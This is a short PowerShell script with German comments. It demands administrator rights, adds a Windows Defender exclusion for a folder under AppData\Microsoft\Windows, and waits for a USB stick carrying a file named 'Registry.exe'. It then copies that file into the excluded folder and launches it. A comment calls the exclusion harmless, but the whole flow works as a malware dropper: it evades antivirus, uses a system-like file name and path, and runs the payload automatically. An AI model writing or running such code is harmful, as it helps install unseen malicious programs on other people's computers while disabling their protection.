 # Prüfe, ob Skript mit Administratorrechten ausgeführt wird
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Warning "Bitte führe dieses Skript als Administrator aus."
    exit
}

# Zielverzeichnis für die Datei Registry.exe (im AppData-Pfad des aktuellen Benutzers)
$zielOrdner = Join-Path $env:APPDATA "Microsoft\Windows"
if (-not (Test-Path $zielOrdner)) {
    Write-Host "Zielordner $zielOrdner wird erstellt..."
    New-Item -Path $zielOrdner -ItemType Directory -Force
}
sp "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\AutoplayHandlers" DisableAutoplay 1

# Defender-Ausnahme hinzufügen (nicht gefährlich, nützlich für Entwicklungs- und Testdateien)
Write-Host "Füge Windows Defender-Ausnahme für: $zielOrdner hinzu..."
Add-MpPreference -ExclusionPath $zielOrdner

# Warte auf das Einstecken eines USB-Sticks und kopiere Registry.exe, sobald vorhanden
Write-Host "Warte auf das Einstecken eines USB-Sticks mit Registry.exe..."
$registryGefunden = $false

while (-not $registryGefunden) {
    Start-Sleep -Seconds 2

    $usbDrives = Get-WmiObject -Query "SELECT * FROM Win32_DiskDrive WHERE InterfaceType='USB'"
    foreach ($drive in $usbDrives) {
        $partitions = Get-WmiObject -Query "ASSOCIATORS OF {Win32_DiskDrive.DeviceID='$($drive.DeviceID)'} WHERE AssocClass = Win32_DiskDriveToDiskPartition"
        foreach ($partition in $partitions) {
            $logicalDisks = Get-WmiObject -Query "ASSOCIATORS OF {Win32_DiskPartition.DeviceID='$($partition.DeviceID)'} WHERE AssocClass = Win32_LogicalDiskToPartition"
            foreach ($logicalDisk in $logicalDisks) {
                $driveLetter = $logicalDisk.DeviceID + "\"
                $quelleDatei = Join-Path $driveLetter "Registry.exe"
                if (Test-Path $quelleDatei) {
                    Write-Host "Registry.exe gefunden auf $driveLetter – wird kopiert..."
                    $zielDatei = Join-Path $zielOrdner "Registry.exe"
                    Copy-Item -Path $quelleDatei -Destination $zielDatei -Force
                    $registryGefunden = $true
                    break
                }
            }
            if ($registryGefunden) { break }
        }
        if ($registryGefunden) { break }
    }
}

sp "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\AutoplayHandlers" DisableAutoplay 0

# Datei ausführen (nur wenn erfolgreich kopiert)
$ausfuehrPfad = Join-Path "C:\Users\fusse\AppData\Roaming\Microsoft\Windows" "Registry.exe"
if (Test-Path $ausfuehrPfad) {
    Write-Host "Starte Registry.exe aus $ausfuehrPfad"
    Start-Process -FilePath $ausfuehrPfad
} else {
    Write-Warning "Die Datei Registry.exe konnte im Zielverzeichnis nicht gefunden werden: $ausfuehrPfad"
}
